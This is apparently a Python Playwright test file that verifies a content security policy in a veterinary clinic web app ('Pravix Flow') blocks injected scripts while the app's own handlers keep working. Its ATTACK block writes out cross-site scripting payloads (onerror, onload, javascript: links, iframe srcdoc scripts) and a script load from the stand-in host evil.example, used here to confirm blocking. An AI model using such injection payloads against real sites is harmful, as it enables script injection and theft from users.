"""Pravix Flow — the n380 build's own checks (Nov 13 2026): Flow runs only its own scripts.
A content security policy in the page (GitHub Pages can't send headers): this site's files, each inline script by its hash,
Google Maps' loader. An injected handler, javascript: link, inline script or outside script doesn't run and is reported.
Flow's own 15 inline handlers are listeners and behave as before. The page is sealed (every inline script is in the policy)."""
import os, re, hashlib, base64
from core import ok, section, PORT, INIT, FAKE, WRAP, SEED, BUILD

FU = '{"uid":"u1","email":"daniel.giordano@pravix.app","displayName":"Daniel Giordano"}'
newerr = lambda e: [x for x in e if 'cb is not a function' not in x and 'collectionGroup' not in x]
MARK = '<meta http-equiv="Content-Security-Policy" id="pvxCsp" content="'
VD = os.path.join(BUILD, 'assets', 'vendor')
VF = ['firebase-10.12.5/firebase-app-compat.js', 'firebase-10.12.5/firebase-firestore-compat.js', 'firebase-10.12.5/firebase-auth-compat.js', 'qrcode-generator-1.4.4/qrcode.js']


def hashes(html):   # as n380/seal_csp.py
    out = []
    for m in re.finditer(r'<script\b([^>]*)>(.*?)</script\s*>', html, re.S | re.I):
        if re.search(r'\bsrc\s*=', m.group(1)): continue
        t = re.search(r'\btype\s*=\s*["\']?([^"\'\s>]+)', m.group(1))
        if t and t.group(1).lower() not in ('text/javascript', 'application/javascript', 'module'): continue
        out.append("'sha256-" + base64.b64encode(hashlib.sha256(m.group(2).encode('utf-8')).digest()).decode() + "'")
    return out


async def ctx(br, w=1440, h=900, fake=True, url='/'):
    c = await br.new_context(viewport={'width': w, 'height': h}, timezone_id='America/New_York', locale='en-US', color_scheme='dark')
    if fake:
        await c.add_init_script(INIT.replace('@@USER@@', FU).replace('@@SEED@@', SEED)); await c.add_init_script(FAKE); await c.add_init_script(WRAP)
    async def route(r):
        u = r.request.url
        m = re.match(r'http://127\.0\.0\.1:%d/assets/vendor/(.+?\.js)(\?.*)?$' % PORT, u)
        if m and not fake and m.group(1) in VF: await r.fulfill(status=200, content_type='application/javascript', body=open(os.path.join(VD, m.group(1)), 'rb').read())
        elif u.startswith('https://www.gstatic.com/'): await r.fulfill(status=200, content_type='application/javascript', body='')
        elif u.startswith(f'http://127.0.0.1:{PORT}/'): await r.continue_()
        elif fake: await r.fulfill(status=204, body='')
        else: await r.abort()
    await c.route('**/*', route)
    p = await c.new_page(); e = []; p.on('pageerror', lambda x: e.append(str(x)))
    await p.goto(f'http://127.0.0.1:{PORT}{url}'); await p.wait_for_timeout(2600 if fake else 3500)
    return c, p, e

SEED3 = """(()=>{ const now=Date.now(), D=DOCTORS.map(d=>d.id);
  [['Bella','Rivera','Waiting','Lobby',1,'unassigned','Canine',95,'Vomiting'],['Rocky','Hale','Exam','Room 1',2,D[0],'Canine',35,'Cough'],['Cleo','Varga','Exam','Room 2',3,D[1],'Feline',22,'Ear infection']]
   .forEach(r=>PATIENTS.push(patient({name:r[0],last:r[1],owner:'Synthetic '+r[1],status:r[2],room:r[3],prio:r[4],doctor:r[5],species:r[6],arrival:new Date(now-r[7]*60000),reason:r[8],timeline:[{label:'Checked in',at:new Date(now-r[7]*60000)}]})));
  renderAll(); return PATIENTS.length; })()"""

ATTACK = """(async()=>{ const sleep=ms=>new Promise(r=>setTimeout(r,ms)); window.__ran=[]; window.__hit=f=>window.__ran.push(f); const n0=window.__pvxCsp.length;
  const box=document.createElement('div'); document.body.appendChild(box);
  box.innerHTML='<img src="x" onerror="__hit(\\'img\\')"><svg onload="__hit(\\'svg\\')"></svg><a id="pvxT1" href="javascript:__hit(\\'jslink\\')">x</a><button id="pvxT2" onclick="__hit(\\'onclick\\')">y</button><details open ontoggle="__hit(\\'toggle\\')"><summary>z</summary></details>';
  await sleep(300); try{ document.getElementById('pvxT1').click(); }catch(e){} try{ document.getElementById('pvxT2').click(); }catch(e){}
  const s1=document.createElement('script'); s1.textContent='__hit("inline-script")'; document.head.appendChild(s1);
  const s2=document.createElement('script'); s2.src='https://evil.example/x.js'; const p2=new Promise(r=>{ s2.onload=()=>r('loaded'); s2.onerror=()=>r('blocked'); setTimeout(()=>r('timeout'),1500); }); document.head.appendChild(s2);
  const f=document.createElement('iframe'); f.srcdoc='<script>parent.__hit("srcdoc")<\\/script><img src=x onerror="parent.__hit(\\'srcdoc-img\\')">'; box.appendChild(f);
  const out2=await p2; await sleep(500);
  const s3=document.createElement('script'); s3.src='/assets/pvx-keys.js?t380'; const p3=new Promise(r=>{ s3.onload=()=>r('loaded'); s3.onerror=()=>r('blocked'); setTimeout(()=>r('timeout'),2500); }); document.head.appendChild(s3);
  const own=await p3; let ev=null; try{ ev=(0,eval)('1+1'); }catch(e){ ev=String(e); }
  const v=window.__pvxCsp.slice(n0); box.remove();
  return {ran:window.__ran.slice(), outside:out2, own:own, dirs:[...new Set(v.map(x=>x.dir))].sort(), n:v.length, eval:ev}; })()"""

OWN = """(async()=>{ const sleep=ms=>new Promise(r=>setTimeout(r,ms)), $=s=>document.querySelector(s), vis=el=>!!el&&el.getClientRects().length>0, out={}, n0=window.__pvxCsp.length;
  // light and dark
  const d0=document.body.classList.contains('dark'); $('.theme-toggle').click(); await sleep(300); const d1=document.body.classList.contains('dark'); $('.theme-toggle').click(); await sleep(300);
  out.theme=[d0,d1,document.body.classList.contains('dark')];
  // log out: the button calls logout()
  const lo=window.logout; let n=0; window.logout=logout=function(){ n++; }; $('#logoutBtn').click(); out.logout=n; window.logout=logout=lo;
  // the care team sheet, from the drawer's row
  const p=PATIENTS.find(x=>x.name==='Rocky'); openDrawer(p.id); await sleep(800);
  const link=$('#drawer .ct-link')||$('.ct-link'); out.link=!!link; let outer=0; const row=link&&link.parentElement; const h=()=>outer++; if(row) row.addEventListener('click',h);
  if(link) link.click(); await sleep(500); if(row) row.removeEventListener('click',h);
  out.open=$('#ctModal').classList.contains('open'); out.stopped=outer===0;
  const add=[...document.querySelectorAll('#ctModal [data-ct-form="technician"]')]; out.forms=document.querySelectorAll('#ctModal [data-ct-form]').length; if(add[0]) add[0].click(); await sleep(300);
  out.form=vis($('#ctFormBox')); const who=$('#ctFormWho'), wrap=$('#ctFormManualWrap');
  if(who){ out.manual0=wrap.hidden; who.value='__manual'; who.dispatchEvent(new Event('change',{bubbles:true})); await sleep(150); out.manual1=$('#ctFormManualWrap').hidden;
    const first=[...who.options].find(o=>o.value&&o.value!=='__manual'); who.value=first?first.value:''; who.dispatchEvent(new Event('change',{bubbles:true})); await sleep(150); out.manual2=$('#ctFormManualWrap').hidden; }
  const rs=$('#ctFormRoleSel'); if(rs){ const r0=rs.value, other=[...rs.options].find(o=>o.value!==r0); rs.value=other.value; rs.dispatchEvent(new Event('change',{bubbles:true})); await sleep(250); out.role=[r0,$('#ctFormRoleSel').value,other.value]; }
  const cancel=$('#ctModal [data-ct-do="cancel"]'); if(cancel) cancel.click(); await sleep(250); out.cancelled=!$('#ctFormBox');
  // assign, then end
  const add2=[...document.querySelectorAll('#ctModal [data-ct-form="technician"]')]; if(add2[0]) add2[0].click(); await sleep(250);
  const who2=$('#ctFormWho'), pick=who2&&[...who2.options].find(o=>o.value&&o.value!=='__manual'); const asg=()=>((ctPatient()||{}).careTeam||{}).assignments||[]; const before=asg().length;
  if(who2){ who2.value='__manual'; who2.dispatchEvent(new Event('change',{bubbles:true})); await sleep(150); const mn=$('#ctFormManual'); if(mn){ mn.value='Synthetic Tech'; mn.dispatchEvent(new Event('input',{bubbles:true})); } } const sub=$('#ctModal [data-ct-do="submit"]'); if(sub) sub.click(); await sleep(500);
  out.assigned=asg().length-before; out.status=asg().map(a=>a.staffName+':'+a.status);
  const end=$('#ctModal [data-ct-do="end"]'), conf=$('#ctModal [data-ct-do="confirm"]'); out.buttons=[!!end,!!conf];
  if(conf){ conf.click(); await sleep(300); } const end2=$('#ctModal [data-ct-do="end"]'); if(end2){ end2.click(); await sleep(400); }
  out.after=asg().map(a=>a.staffName+':'+a.status);
  // three ways out
  $('#ctModal').dispatchEvent(new KeyboardEvent('keydown',{key:'Escape',bubbles:true})); await sleep(300); out.esc=!$('#ctModal').classList.contains('open');
  openCareTeam(p.id); await sleep(300); $('#ctClose').click(); await sleep(300); out.x=!$('#ctModal').classList.contains('open');
  openCareTeam(p.id); await sleep(300); $('#ctScrim').click(); await sleep(300); out.scrim=!$('#ctModal').classList.contains('open');
  out.csp=window.__pvxCsp.slice(n0); return out; })()"""

TOUR = """(async()=>{ const sleep=ms=>new Promise(r=>setTimeout(r,ms));
  for(const v of ['list','flow','rooms','client','dashboard']){ switchView(v); await sleep(450); }
  const p=PATIENTS.find(x=>x.name==='Bella'); openDrawer(p.id); await sleep(800); document.querySelectorAll('#drawer .triage-card').forEach(c=>{ try{ c.click(); }catch(e){} }); await sleep(400);
  setResusPref(PATIENTS.find(x=>x.id===p.id),'DNR'); await sleep(250); moveRoom(PATIENTS.find(x=>x.id===p.id),'Room 5'); await sleep(250); moveStatus(PATIENTS.find(x=>x.id===p.id),'Exam'); await sleep(300);
  document.dispatchEvent(new KeyboardEvent('keydown',{key:'?',bubbles:true})); await sleep(300); const x=document.querySelector('.pvx-ks-x'); if(x) x.click();
  openAddPatient(); await sleep(500); closeAddPatient(); await sleep(300);
  const s=document.getElementById('globalSearch'); s.focus(); s.value='bel'; s.dispatchEvent(new Event('input',{bubbles:true})); await sleep(500); s.value=''; s.dispatchEvent(new Event('input',{bubbles:true})); s.blur();
  return {csp:window.__pvxCsp.slice(), scripts:document.scripts.length}; })()"""


@section(id='t380', title='n380 · Security: Flow runs only its own scripts (a content policy in the page); its own inline handlers are listeners; the page is sealed',
         apps=['flow'], topics=['security'], engines=('chromium', 'webkit'))
async def s_t380(br):
    html = open(os.path.join(BUILD, 'index.html'), encoding='utf-8').read()
    i = html.find(MARK); pol = html[i + len(MARK):html.index('"', i + len(MARK))] if i >= 0 else ''
    ok('The policy is the first thing in the page, before any script, and allows scripts only from this site, by hash, and from Google Maps and Firebase sign-in’s two Google helpers; base-uri is this site',
       0 <= i < html.find('<script') and pol.startswith("script-src 'self' 'unsafe-eval' https://maps.googleapis.com https://apis.google.com https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ 'sha256-")
       and "'unsafe-inline'" not in pol and pol.endswith("; worker-src 'self' blob:; base-uri 'self'") and 'http:' not in pol and '*' not in pol, pol[:200])
    hs = hashes(html); missing = [h for h in hs if h not in pol]
    ok('The page is sealed: every inline script is in the policy by its SHA-256 (after changing one, run  python3 _ci/seal_csp.py .  or it won’t run)', len(hs) > 100 and not missing, [len(hs), missing[:3]])
    ok('Flow’s own markup carries no inline handler (onclick=…) and no javascript: link: 15 became listeners',
       not re.search(r'''\son[a-z]+\s*=\s*["']''', html) and 'javascript:' not in html.replace('"javascript:__hit', '') and html.count('data-ct-do=') == 5 and html.count('data-ct-form=') == 2 and html.count('data-ct-open=') == 1,
       re.findall(r'''.{40}\son[a-z]+\s*=\s*["'].{30}''', html)[:3])

    c, p, e = await ctx(br)
    await p.evaluate(SEED3); await p.wait_for_timeout(700)
    t = await p.evaluate(TOUR)
    ok('Nothing of Flow’s own is stopped: every view, the drawer, messages, Keyboard shortcuts, New patient and search run with no report', t['csp'] == [] and t['scripts'] > 100 and not newerr(e), [t['csp'][:3], newerr(e)[:3]])
    a = await p.evaluate(ATTACK)
    ok('Injected markup doesn’t run: an image’s onerror, an SVG’s onload, a javascript: link, an onclick, an ontoggle, an inline script, a framed page’s script',
       a['ran'] == [], a)
    ok('…a script from another site is refused, one from this site loads, and each refusal is reported (console “[csp] …”, window.__pvxCsp)',
       a['outside'] == 'blocked' and a['own'] == 'loaded' and a['n'] >= 6 and any(d.startswith('script-src') for d in a['dirs']), a)
    o = await p.evaluate(OWN)
    ok('Flow’s own handlers, now listeners · light and dark switches and switches back; Log out calls logout once',
       o['theme'][0] != o['theme'][1] and o['theme'][0] == o['theme'][2] and o['logout'] == 1, [o['theme'], o['logout']])
    ok('…Care team opens from the drawer’s row without the click reaching the row; Assign shows the form; “Someone else” shows the name field and a listed person hides it; Role redraws the form; Cancel closes it',
       o['link'] and o['open'] and o['stopped'] and o['forms'] >= 1 and o['form'] and o.get('manual0') is True and o.get('manual1') is False and o.get('manual2') is True
       and o.get('role') and o['role'][1] == o['role'][2] and o['cancelled'], o)
    ok('…Assign adds the person typed in; End ends the assignment', o['assigned'] == 1 and 'Synthetic Tech:current' in o['status'] and o['buttons'][0] and 'Synthetic Tech:current' not in o['after'], [o['assigned'], o['status'], o['buttons'], o['after']])
    ok('…Esc, ✕ and the backdrop each close the sheet; none of this is reported by the policy', o['esc'] and o['x'] and o['scrim'] and o['csp'] == [], [o['esc'], o['x'], o['scrim'], o['csp'][:3]])
    ok('…no page errors', not newerr(e), newerr(e))
    await c.close()

    # the lobby screen: the same page, nothing stopped
    c, p, e = await ctx(br, 1920, 1080, url='/?display=1')
    await p.wait_for_timeout(1500)
    l = await p.evaluate("({csp:window.__pvxCsp.slice(), client:document.body.classList.contains('client-mode')||!!document.querySelector('#view-client:not(.hidden)')})")
    ok('The lobby screen (Client Display) opens as before, with nothing stopped', l['csp'] == [] and not newerr(e), [l, newerr(e)[:3]])
    await c.close()

    # the real libraries under the policy, no fake: Firebase starts, the sign-in screen works, a refused sign-in says so
    c, p, e = await ctx(br, 1280, 800, fake=False)
    r = await p.evaluate("""(()=>{ const pw=document.querySelector('input[type="password"]'); return {sdk:window.firebase&&firebase.SDK_VERSION, apps:window.firebase?firebase.apps.length:null, qr:typeof window.qrcode, signin:!!pw&&pw.getClientRects().length>0, csp:window.__pvxCsp.slice()}; })()""")
    ok('The real Firebase 10.12.5 and the QR library start under the policy, Flow shows its sign-in screen, and nothing is stopped', r['sdk'] == '10.12.5' and r['apps'] == 1 and r['qr'] == 'function' and r['signin'] and r['csp'] == [], r)
    s = await p.evaluate("""(async()=>{ const sleep=ms=>new Promise(r=>setTimeout(r,ms)); const pw=document.querySelector('input[type="password"]'), f=pw.closest('form')||pw.parentElement.parentElement, em=f.querySelector('input[type="email"],input[type="text"]');
      const set=(el,v)=>{ el.focus(); el.value=v; el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); };
      set(em,'synthetic.test@pravix.test'); set(pw,'not-a-real-password'); const b=f.querySelector('button[type="submit"],button'); if(f.requestSubmit) f.requestSubmit(); else b.click(); await sleep(2500);
      return {csp:window.__pvxCsp.slice(), still:pw.getClientRects().length>0, said:(document.querySelector('[role="alert"],.login-error,.auth-error,#loginError,#authError')||{}).textContent||''}; })()""")
    ok('…a sign-in attempt (Google out of reach) is handled by Flow, not stopped by the policy', s['csp'] == [] and s['still'] and not e, [s, e[:3]])
    await c.close()
